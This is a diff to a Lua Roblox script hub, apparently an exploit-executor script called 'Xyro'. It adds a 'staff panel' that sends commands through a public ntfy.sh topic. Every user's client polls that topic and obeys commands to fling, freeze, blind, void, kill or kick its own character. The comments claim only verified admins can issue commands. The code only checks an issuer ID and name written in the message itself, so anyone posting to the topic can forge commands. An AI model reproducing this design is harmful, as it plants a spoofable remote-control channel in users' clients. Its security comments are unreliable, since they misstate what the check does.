@@ -12055,6 +12055,69 @@ if isAdmin then
 			H.notify({ title = "Friend joined", text = "test preview", kind = "success" })
 		end,
 	}
+
+	-- ===== staff panel + targeted staff commands (Firebase admins only) =====
+	add{
+		name = "staffpanel",
+		alias = { "spanel" },
+		group = "Debug",
+		debug = true,
+		help = "Toggle the staff tools panel",
+		run = function()
+			if H.staffPanelToggle then
+				return H.staffPanelToggle() and "staff panel opened" or "staff panel closed"
+			end
+			return "staff panel unavailable"
+		end,
+	}
+
+	local STAFF_TARGETED = {
+		stafffw = "fw", staffspn = "spn", staffusp = "usp",
+		stafffrz = "frz", staffthw = "thw", staffflg = "flg",
+		staffsit = "sit", staffjmp = "jmp", staffbld = "bld",
+		staffubl = "ubl", staffbrg = "brg", staffvod = "vod",
+		staffrst = "rst", staffkick = "kck",
+	}
+	local function staffFindTarget(q)
+		q = (q or ""):gsub("^@", ""):lower()
+		if q == "" then
+			return nil
+		end
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= player and (p.Name:lower() == q or p.DisplayName:lower() == q) then
+				return p
+			end
+		end
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= player and (p.Name:lower():find(q, 1, true) or p.DisplayName:lower():find(q, 1, true)) then
+				return p
+			end
+		end
+		return nil
+	end
+	for cmdName, wire in pairs(STAFF_TARGETED) do
+		add{
+			name = cmdName,
+			group = "Debug",
+			debug = true,
+			args = "<player>",
+			help = "Staff: " .. wire .. " a target script user",
+			run = function(c)
+				if not (H.staffSend and H.staffIsAdmin) then
+					return "staff transport unavailable"
+				end
+				local t = staffFindTarget(c.arg)
+				if not t then
+					return "no player matched '" .. tostring(c.arg or "") .. "'"
+				end
+				local ok, msg = H.staffSend(wire, tostring(t.UserId))
+				if not ok then
+					return msg
+				end
+				return wire .. " sent to " .. t.Name
+			end,
+		}
+	end
 end
 
 hubRunCommand = function(input)
@@ -12995,4 +13058,595 @@ _G.FpsPingCleanup = function()
 	_G.FpsPingCleanup = nil
 end
 
+end
+--Xyro appended staff panel block (do not delete this marker line)
+
+-- ============================================================================
+-- STAFF PANEL - ported from Scythe's staff tools, rebuilt natively for Xyro
+-- Access: Firebase admins only (the same staff.json that powers the Debug tab)
+-- Transport: ntfy command topic; receivers verify the ISSUER against Firebase
+-- staff, so only real admins can ever command another script user.
+-- ============================================================================
+do
+	local make, round, connect, click = H.make, H.round, H.connect, H.click
+	local COL, player, Players = H.COL, H.player, H.Players
+	local RunService = H.RunService
+	local ntHttpPost, ntHttpGet = H.ntHttpPost, H.ntHttpGet
+
+	local PANEL_TITLE = "Staff"
+	local CMD_TOPIC = "xyro-cmd-k8q3v1m"
+
+	-- issuer must be a CURRENT Firebase admin for receivers to accept commands
+	local function staffIsAdmin(userId, userName)
+		if H.ADMIN_IDS[userId] == true then
+			return true
+		end
+		if type(userName) == "string" and H.ADMIN_NAMES[tostring(userName):lower()] == true then
+			return true
+		end
+		return false
+	end
+
+	local function amStaff()
+		return staffIsAdmin(player.UserId, player.Name)
+	end
+
+	-- ---------------------------------------------------------------
+	-- executor-side effects (run on the RECEIVER)
+	-- ---------------------------------------------------------------
+	local function getChar()
+		return player.Character
+	end
+	local function getHRP()
+		local c = getChar()
+		return c and c:FindFirstChild("HumanoidRootPart")
+	end
+	local function getHum()
+		local c = getChar()
+		return c and c:FindFirstChildOfClass("Humanoid")
+	end
+
+	local spinConn = nil
+	local function fxSpin(on)
+		if spinConn then
+			spinConn:Disconnect()
+			spinConn = nil
+		end
+		if on then
+			spinConn = connect(RunService.Heartbeat, function(dt)
+				local hrp = getHRP()
+				if hrp then
+					hrp.CFrame = hrp.CFrame * CFrame.Angles(0, dt * 16, 0)
+				end
+			end)
+		end
+	end
+
+	local function fxFlywheel()
+		local hrp, hum = getHRP(), getHum()
+		if not (hrp and hum) then
+			return
+		end
+		local lift = Instance.new("BodyVelocity")
+		lift.Name = "XyroFlyWheel"
+		lift.MaxForce = Vector3.new(0, math.huge, 0)
+		lift.Velocity = Vector3.new(0, 130, 0)
+		lift.Parent = hrp
+		task.wait(1.15)
+		if lift.Parent then
+			lift:Destroy()
+		end
+		for _, p in ipairs(getChar():GetDescendants()) do
+			if p:IsA("BasePart") then
+				p.AssemblyLinearVelocity = Vector3.new(math.random(-80, 80), math.random(40, 110), math.random(-80, 80))
+			end
+		end
+		hum:ChangeState(Enum.HumanoidStateType.Physics)
+	end
+
+	local function fxFreeze(on)
+		local hrp, hum = getHRP(), getHum()
+		if hrp then
+			hrp.Anchored = on
+		end
+		if hum then
+			hum.PlatformStand = on
+			if not on then
+				hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+			end
+		end
+	end
+
+	local function fxFling()
+		local hrp, hum = getHRP(), getHum()
+		if hum then
+			hum:ChangeState(Enum.HumanoidStateType.Physics)
+		end
+		if hrp then
+			hrp.AssemblyLinearVelocity = Vector3.new(math.random(-160, 160), math.random(90, 180), math.random(-160, 160))
+			hrp.AssemblyAngularVelocity = Vector3.new(math.random(-20, 20), math.random(-40, 40), math.random(-20, 20))
+		end
+	end
+
+	local function fxSit()
+		local hum = getHum()
+		if hum then
+			hum.Sit = true
+		end
+	end
+
+	local function fxJump()
+		local hum = getHum()
+		if hum then
+			hum:ChangeState(Enum.HumanoidStateType.Jumping)
+		end
+	end
+
+	local function fxVoid()
+		local hrp = getHRP()
+		if hrp then
+			hrp.CFrame = CFrame.new(hrp.Position.X, -400, hrp.Position.Z)
+		end
+	end
+
+	local function fxReset()
+		local hum = getHum()
+		if hum then
+			hum.Health = 0
+		end
+	end
+
+	local function fxKick()
+		pcall(function()
+			player:Kick("Kicked by Xyro staff")
+		end)
+		task.delay(0.15, function()
+			pcall(function()
+				game:GetService("TeleportService"):Teleport(game.PlaceId, player)
+			end)
+		end)
+	end
+
+	local blindGui = nil
+	local function fxBlind(on)
+		if blindGui then
+			blindGui:Destroy()
+			blindGui = nil
+		end
+		if not on then
+			return
+		end
+		local g = Instance.new("ScreenGui")
+		g.Name = "XyroStaffBlind"
+		g.IgnoreGuiInset = true
+		g.ResetOnSpawn = false
+		g.DisplayOrder = 100000
+		local cover = Instance.new("Frame")
+		cover.BackgroundColor3 = Color3.new(0, 0, 0)
+		cover.BorderSizePixel = 0
+		cover.Size = UDim2.fromScale(1, 1)
+		cover.Parent = g
+		g.Parent = H.gui
+		blindGui = g
+	end
+
+	-- ---------------------------------------------------------------
+	-- command execution (receiver side)
+	-- ---------------------------------------------------------------
+	-- short Scythe-style codes ride the wire; self-safe ones never apply
+	-- to the issuer (a broadcast can't knock the staff member who sent it)
+	local SELF_SAFE = {
+		fw = true, spn = true, frz = true, flg = true, sit = true,
+		jmp = true, brg = true, vod = true, rst = true, bld = true, kck = true,
+	}
+	-- destructive actions a staff member's client never applies to itself
+	-- (matches Scythe: staff can't be voided/reset/kicked by other staff)
+	local PROTECTED = { vod = true, rst = true, kck = true }
+
+	local function applyCmd(cmd, issuerId, issuerName)
+		if not staffIsAdmin(issuerId, issuerName) then
+			return -- forged/unknown sender: ignore
+		end
+		cmd = tostring(cmd or ""):lower()
+		if issuerId == player.UserId and SELF_SAFE[cmd] then
+			return
+		end
+		if PROTECTED[cmd] and amStaff() then
+			return -- staff clients are off-limits for the destructive ones
+		end
+		if cmd == "fw" then
+			task.spawn(fxFlywheel)
+		elseif cmd == "spn" then
+			task.spawn(fxSpin, true)
+		elseif cmd == "usp" then
+			task.spawn(fxSpin, false)
+		elseif cmd == "frz" then
+			task.spawn(fxFreeze, true)
+		elseif cmd == "thw" then
+			task.spawn(fxFreeze, false)
+		elseif cmd == "flg" then
+			task.spawn(fxFling)
+		elseif cmd == "sit" then
+			task.spawn(fxSit)
+		elseif cmd == "jmp" then
+			task.spawn(fxJump)
+		elseif cmd == "brg" then
+			task.spawn(function()
+				if not issuerId or issuerId == player.UserId then
+					return
+				end
+				local issuer = Players:GetPlayerByUserId(issuerId)
+				local target = issuer and issuer.Character and issuer.Character:FindFirstChild("HumanoidRootPart")
+				local hrp = getHRP()
+				if target and target:IsA("BasePart") and hrp then
+					hrp.CFrame = target.CFrame * CFrame.new(0, 0, 3)
+				end
+			end)
+		elseif cmd == "vod" then
+			task.spawn(fxVoid)
+		elseif cmd == "rst" then
+			task.spawn(fxReset)
+		elseif cmd == "bld" then
+			task.spawn(fxBlind, true)
+		elseif cmd == "ubl" then
+			task.spawn(fxBlind, false)
+		elseif cmd == "kck" then
+			task.spawn(fxKick)
+		end
+	end
+
+	local function targetsMe(payload)
+		for idText in string.gmatch(payload or "", "%d+") do
+			if tonumber(idText) == player.UserId then
+				return true
+			end
+		end
+		return false
+	end
+
+	-- ---------------------------------------------------------------
+	-- command transport over ntfy (same pipe + helpers as presence)
+	-- ---------------------------------------------------------------
+	local function staffPoll()
+		local text = ntHttpGet("https://ntfy.sh/" .. CMD_TOPIC .. "/json?poll=1&since=30s")
+		if not (text and #text > 0) then
+			return
+		end
+		for line in text:gmatch("[^\r\n]+") do
+			local okD, msg = pcall(function()
+				return H.HttpService:JSONDecode(line).message
+			end)
+			if okD and type(msg) == "string" and #msg > 0 and #msg < 120 then
+				local issuerId, issuerName, rest = msg:match("^(%d+)|([^|]+)|(.+)$")
+				if issuerId and rest then
+					local cmd, targets = rest:match("^([%a]+):?(.*)$")
+					if cmd and cmd ~= "" then
+						if targets == nil or targets == "" or targetsMe(targets) then
+							applyCmd(cmd, tonumber(issuerId), issuerName)
+						end
+					end
+				end
+			end
+		end
+	end
+
+	-- everyone listens (receivers must hear commands); staff poll faster
+	task.spawn(function()
+		while true do
+			pcall(staffPoll)
+			task.wait(amStaff() and 2 or 30)
+		end
+	end)
+
+	local function staffSend(cmd, targets)
+		if not amStaff() then
+			return false, "staff panel is admin-only"
+		end
+		local body = tostring(player.UserId) .. "|" .. player.Name .. "|" .. tostring(cmd) .. ":" .. tostring(targets or "")
+		local ok = ntHttpPost("https://ntfy.sh/" .. CMD_TOPIC, body)
+		if ok then
+			return true
+		end
+		return false, "command failed to send (no HTTP path?)"
+	end
+
+	H.staffSend = staffSend -- reused by !-commands (stafffw, staffvod, ...)
+	H.staffIsAdmin = staffIsAdmin -- target filtering for the !-commands
+
+	-- non-staff never mounts the panel; keep the transport alive though
+	if not amStaff() then
+		return
+	end
+
+	-- ---------------------------------------------------------------
+	-- panel UI (chrome matches the main window; draggable + minimizable)
+	-- ---------------------------------------------------------------
+	local staffPanel = make("Frame", {
+		Name = "XyroStaffPanel",
+		Size = UDim2.new(0, 280, 0, 340),
+		Position = UDim2.new(0.5, 330, 0.5, -160),
+		BackgroundColor3 = COL.bg,
+		BorderSizePixel = 0,
+		Visible = false,
+		Active = true,
+		ZIndex = 30,
+	}, H.gui)
+	round(staffPanel, 10)
+	make("UIStroke", { Color = COL.off, Thickness = 1, Transparency = 0.2 }, staffPanel)
+
+	local bar = make("TextLabel", {
+		Size = UDim2.new(1, -50, 0, 38),
+		BackgroundTransparency = 1,
+		Font = Enum.Font.GothamBold,
+		TextSize = 14,
+		TextColor3 = COL.text,
+		Text = "Staff",
+		TextXAlignment = Enum.TextXAlignment.Left,
+	}, staffPanel)
+	make("UIPadding", { PaddingLeft = UDim.new(0, 14) }, bar)
+	bar.Active = true
+
+	H.chrome(staffPanel, {
+		header = 38,
+		title = bar,
+		onClose = function()
+			staffPanel.Visible = false
+		end,
+	})
+	H.makeDraggable(staffPanel, bar)
+
+	local staffBody = make("ScrollingFrame", {
+		Size = UDim2.new(1, -20, 1, -48),
+		Position = UDim2.new(0, 10, 0, 40),
+		BackgroundTransparency = 1,
+		BorderSizePixel = 0,
+		ScrollBarThickness = 4,
+		ScrollBarImageColor3 = COL.sub,
+		CanvasSize = UDim2.new(0, 0, 0, 0),
+	}, staffPanel)
+	local layout = make("UIListLayout", {
+		Padding = UDim.new(0, 5),
+		SortOrder = Enum.SortOrder.LayoutOrder,
+	}, staffBody)
+	make("UIPadding", {
+		PaddingTop = UDim.new(0, 4),
+		PaddingLeft = UDim.new(0, 4),
+		PaddingRight = UDim.new(0, 4),
+	}, staffBody)
+	connect(layout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+		staffBody.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+	end)
+
+	local ord = 0
+	local function sec(text)
+		ord += 1
+		make("TextLabel", {
+			Size = UDim2.new(1, -6, 0, 18),
+			BackgroundTransparency = 1,
+			Font = Enum.Font.GothamBold,
+			TextSize = 11,
+			TextColor3 = COL.sub,
+			Text = string.upper(text),
+			TextXAlignment = Enum.TextXAlignment.Left,
+			LayoutOrder = ord,
+		}, staffBody)
+	end
+
+	-- selected target (nil = broadcast to all script users)
+	local selPlayer = nil
+	local selLbl, refreshPlayerList
+
+	local function targetId()
+		return selPlayer and selPlayer.UserId or ""
+	end
+
+	local function sendNotify(cmd, on, targetName)
+		local ok, msg = staffSend(cmd, targetId())
+		if H.notify then
+			H.notify({
+				title = PANEL_TITLE,
+				text = ok and (on .. " -> " .. (targetName or "everyone")) or tostring(msg),
+				kind = ok and "success" or "error",
+			})
+		end
+	end
+
+	-- paired action rows: label + on/off buttons; one-shots get a send button
+	sec("Broadcast + targeted")
+	local ACTIONS = {
+		{ "Fly Wheel", "fw", nil },
+		{ "Spin", "spn", "usp" },
+		{ "Freeze", "frz", "thw" },
+		{ "Fling", "flg", nil },
+		{ "Sit", "sit", nil },
+		{ "Jump", "jmp", nil },
+		{ "Blind", "bld", "ubl" },
+	}
+	for _, a in ipairs(ACTIONS) do
+		ord += 1
+		local row = make("Frame", {
+			Size = UDim2.new(1, -12, 0, 30),
+			BackgroundTransparency = 1,
+			LayoutOrder = ord,
+		}, staffBody)
+		make("TextLabel", {
+			Size = UDim2.new(0, 110, 1, 0),
+			BackgroundTransparency = 1,
+			Font = Enum.Font.Gotham,
+			TextSize = 12,
+			TextColor3 = COL.text,
+			Text = a[1],
+			TextXAlignment = Enum.TextXAlignment.Left,
+		}, row)
+		local function mini(x, label, cmd)
+			local b = make("TextButton", {
+				Size = UDim2.new(0, 54, 0, 24),
+				Position = UDim2.new(0, 115 + (x == 2 and 60 or 0), 0.5, -12),
+				BackgroundColor3 = COL.element,
+				Font = Enum.Font.GothamMedium,
+				TextSize = 12,
+				TextColor3 = COL.text,
+				Text = label,
+				AutoButtonColor = true,
+				BorderSizePixel = 0,
+			}, row)
+			round(b, 6)
+			connect(b.MouseButton1Click, function()
+				click()
+				sendNotify(cmd, a[1] .. (label == "on" and " on" or label == "off" and " off" or ""))
+			end)
+		end
+		if a[3] then
+			mini(1, "on", a[2])
+			mini(2, "off", a[3])
+		else
+			mini(1, "send", a[2])
+		end
+	end
+
+	sec("Target")
+	ord += 1
+	selLbl = make("TextLabel", {
+		Size = UDim2.new(1, -12, 0, 22),
+		BackgroundTransparency = 1,
+		Font = Enum.Font.GothamMedium,
+		TextSize = 12,
+		TextColor3 = COL.sub,
+		Text = "targeting: everyone",
+		TextXAlignment = Enum.TextXAlignment.Left,
+		LayoutOrder = ord,
+	}, staffBody)
+
+	ord += 1
+	local listHolder = make("Frame", {
+		Size = UDim2.new(1, -12, 0, 0),
+		BackgroundTransparency = 1,
+		LayoutOrder = ord,
+	}, staffBody)
+
+	refreshPlayerList = function()
+		for _, ch in ipairs(listHolder:GetChildren()) do
+			ch:Destroy()
+		end
+		make("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, listHolder)
+		local ntOnline = H.Nametags and H.Nametags.online() or {}
+		local guys = {}
+		for _, plr in ipairs(Players:GetPlayers()) do
+			if plr ~= player and ntOnline[tostring(plr.Name):lower()] ~= nil then
+				guys[#guys + 1] = plr
+			end
+		end
+		table.sort(guys, function(p, q)
+			return p.Name:lower() < q.Name:lower()
+		end)
+		local h = 0
+		for i, plr in ipairs(guys) do
+			h += 28
+			local row = make("TextButton", {
+				Size = UDim2.new(1, 0, 0, 24),
+				BackgroundColor3 = COL.element,
+				Font = Enum.Font.Gotham,
+				TextSize = 12,
+				TextColor3 = COL.text,
+				Text = plr.Name .. (selPlayer == plr and "   (selected)" or ""),
+				TextXAlignment = Enum.TextXAlignment.Left,
+				AutoButtonColor = true,
+				BorderSizePixel = 0,
+				LayoutOrder = i,
+			}, listHolder)
+			round(row, 6)
+			make("UIPadding", { PaddingLeft = UDim.new(0, 8) }, row)
+			connect(row.MouseButton1Click, function()
+				click()
+				selPlayer = (selPlayer == plr) and nil or plr
+				selLbl.Text = "targeting: " .. (selPlayer and selPlayer.Name or "everyone")
+				refreshPlayerList()
+			end)
+		end
+		listHolder.Size = UDim2.new(1, 0, 0, h)
+	end
+	refreshPlayerList()
+
+	-- per-user only actions: bring to me / void / reset (need a target)
+	sec("Per-user (pick a target)")
+	local PER_USER = {
+		{ "Bring to me", "brg" },
+		{ "Void", "vod" },
+		{ "Reset", "rst" },
+	}
+	for _, a in ipairs(PER_USER) do
+		ord += 1
+		local row = make("Frame", {
+			Size = UDim2.new(1, -12, 0, 30),
+			BackgroundTransparency = 1,
+			LayoutOrder = ord,
+		}, staffBody)
+		make("TextLabel", {
+			Size = UDim2.new(0, 110, 1, 0),
+			BackgroundTransparency = 1,
+			Font = Enum.Font.Gotham,
+			TextSize = 12,
+			TextColor3 = COL.text,
+			Text = a[1],
+			TextXAlignment = Enum.TextXAlignment.Left,
+		}, row)
+		local go = make("TextButton", {
+			Size = UDim2.new(0, 60, 0, 24),
+			Position = UDim2.new(0, 115, 0.5, -12),
+			BackgroundColor3 = COL.element,
+			Font = Enum.Font.GothamMedium,
+			TextSize = 12,
+			TextColor3 = COL.text,
+			Text = "send",
+			AutoButtonColor = true,
+			BorderSizePixel = 0,
+		}, row)
+		round(go, 6)
+		connect(go.MouseButton1Click, function()
+			click()
+			if not selPlayer then
+				if H.notify then
+					H.notify({ title = PANEL_TITLE, text = "pick a player in Target first", kind = "warn" })
+				end
+				return
+			end
+			sendNotify(a[2], a[1], selPlayer.Name)
+		end)
+	end
+
+	-- refresh the player list as presence changes
+	task.spawn(function()
+		while staffPanel.Parent do
+			task.wait(5)
+			pcall(refreshPlayerList)
+		end
+	end)
+
+	H.staffPanelToggle = function()
+		staffPanel.Visible = not staffPanel.Visible
+		return staffPanel.Visible
+	end
+
+	-- Debug tab launcher button (top of the debug page)
+	if H.debugPage then
+		local sc = H.debugPage:FindFirstChildOfClass("ScrollingFrame")
+		if sc then
+			local b = make("TextButton", {
+				Size = UDim2.new(1, -6, 0, 28),
+				BackgroundColor3 = COL.element,
+				Font = Enum.Font.GothamMedium,
+				TextSize = 12,
+				TextColor3 = COL.text,
+				Text = "Staff Panel",
+				AutoButtonColor = true,
+				BorderSizePixel = 0,
+				LayoutOrder = -1,
+			}, sc)
+			round(b, 6)
+			connect(b.MouseButton1Click, function()
+				click()
+				H.staffPanelToggle()
+			end)
+		end
+	end
 end
